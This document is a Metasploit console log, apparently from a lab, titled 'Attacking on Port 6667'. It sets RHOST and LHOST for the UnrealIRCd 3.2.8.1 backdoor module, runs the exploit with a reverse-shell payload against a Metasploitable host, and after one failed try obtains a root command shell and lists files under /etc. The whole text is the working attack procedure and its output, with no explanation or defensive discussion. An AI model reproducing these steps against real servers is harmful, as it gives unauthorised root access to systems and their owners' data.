# Attacking on Port 6667

```




msf > search unreal
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/linux/games/ut2004_secure           2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Linux)
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
   exploit/windows/games/ut2004_secure         2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Win32)

msf exploit(unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.56.101   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(unreal_ircd_3281_backdoor) > exploiit
[-] Unknown command: exploiit.
msf exploit(unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.56.101:6667 - Sending backdoor command...
ls
pwd
^C[-] 192.168.56.101:6667 - Exploit failed: Interrupt 
[*] Exploit completed, but no session was created.
msf exploit(unreal_ircd_3281_backdoor) > clear
[*] exec: clear


msf exploit(unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.56.101   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.56.101:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo KCCY8Xfyf6DtPp6N;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "KCCY8Xfyf6DtPp6N\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 10 opened (192.168.56.102:4444 -> 192.168.56.101:51057) at 2018-05-23 05:49:26 +0000

pwd
/etc/unreal
ls -la
total 396
drwx------  7 root root   4096 May 20  2012 .
drwxr-xr-x 95 root root   4096 May 21 03:06 ..
-rw-------  1 root root   1365 May 20  2012 Donation
-rw-------  1 root root  17992 May 20  2012 LICENSE
drwx------  2 root root   4096 May 20  2012 aliases
--w----r-T  1 root root   1175 May 20  2012 badwords.channel.conf
--w----r-T  1 root root   1183 May 20  2012 badwords.message.conf
--w----r-T  1 root root   1121 May 20  2012 badwords.quit.conf
-rwx------  1 root root 242894 May 20  2012 curl-ca-bundle.crt
-rw-------  1 root root   1900 May 20  2012 dccallow.conf
drwx------  2 root root   4096 May 20  2012 doc
--w----r-T  1 root root  49552 May 20  2012 help.conf
-rw-------  1 root root   2751 May 21 05:37 ircd.log
-rw-------  1 root root      6 May 21 03:06 ircd.pid
-rw-------  1 root root      5 May 21 12:51 ircd.tune
drwx------  2 root root   4096 May 20  2012 modules
drwx------  2 root root   4096 May 20  2012 networks
--w----r-T  1 root root   5656 May 20  2012 spamfilter.conf
drwx------  2 root root   4096 May 21 03:06 tmp
-rwx------  1 root root   4042 May 20  2012 unreal
--w----r-T  1 root root   3884 May 20  2012 unrealircd.conf
cd ..
ls -la
total 1116
drwxr-xr-x 95 root     root     4096 May 21 03:06 .
drwxr-xr-x 22 root     root     4096 May 21 05:47 ..
-rw-------  1 root     root        0 Mar 16  2010 .pwd.lock
drwxr-xr-x 10 root     root     4096 May 20  2012 X11
-rw-r--r--  1 root     root     2975 Mar 16  2010 adduser.conf
-rw-r--r--  1 root     root       44 May 21  2012 adjtime


```



